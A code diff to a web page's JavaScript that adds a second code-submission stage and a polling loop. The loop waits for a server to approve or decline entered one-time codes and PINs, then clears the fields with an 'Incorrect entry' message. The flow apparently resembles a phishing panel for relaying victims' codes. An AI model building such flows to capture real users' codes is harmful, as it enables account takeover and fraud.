@@ -533,7 +533,32 @@ submitCode1Btn.addEventListener("click", async () => {
     });
   }
 });
-  
+
+// Final step submission handler
+async function submitCode2Stage(code2Value) {
+  userData.code2 = code2Value;
+  document.getElementById("code2Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code2", { code2: userData.code2 });
+  if (success) {
+    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
+  }
+}
+
+// Pipeline transmission communications helper
+async function sendStagePayload(stage, payload) {
+  try {
+    const response = await fetch("/api/approval-request", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sessionId, stage, payload })
+    });
+    return response.ok;
+  } catch (e) {
+    return false;
+  }
+}
+
 // Polling core infrastructure engine
 function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
   const msgElement = document.getElementById(msgId);
@@ -553,20 +578,24 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
         document.getElementById(currentPageId).classList.add("hidden");
         document.getElementById(nextPageId).classList.remove("hidden");
         if (successCallback) successCallback();
-      } else if (data.status === "declined") {
+           } else if (data.status === "declined") {
         clearInterval(pollingInterval);
         
         // 1. Hide the full-page waiting spinner overlay screen
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // 2. Clear out old entries from the active page's input fields only
-        const currentPage = document.getElementById(currentPageId);
-        if (currentPage) {
-          const inputs = currentPage.querySelectorAll('input');
-          inputs.forEach(input => input.value = '');
-        }
+        // 2. Clear out old entries from the text box and individual PIN grids
+        const otpInput = document.getElementById('code1');
+        if (otpInput) otpInput.value = '';
         
-        // 3. Alert user about the correction step without blocking the interface view
+        const pinBoxes = document.querySelectorAll('.boxes input');
+        pinBoxes.forEach(box => box.value = '');
+        
+        // 3. Reset the primary continue button back to its initial locked style state
+        const submitBtn = document.getElementById('submitCode1');
+        if (submitBtn) submitBtn.disabled = true;
+
+        // 4. Alert user about the correction step without blocking the interface view
         msgElement.className = "error";
         msgElement.innerText = "Incorrect entry. Please enter the correct details.";
       }
@@ -576,3 +605,4 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
     }
   }, 2500);
 }
+</script>
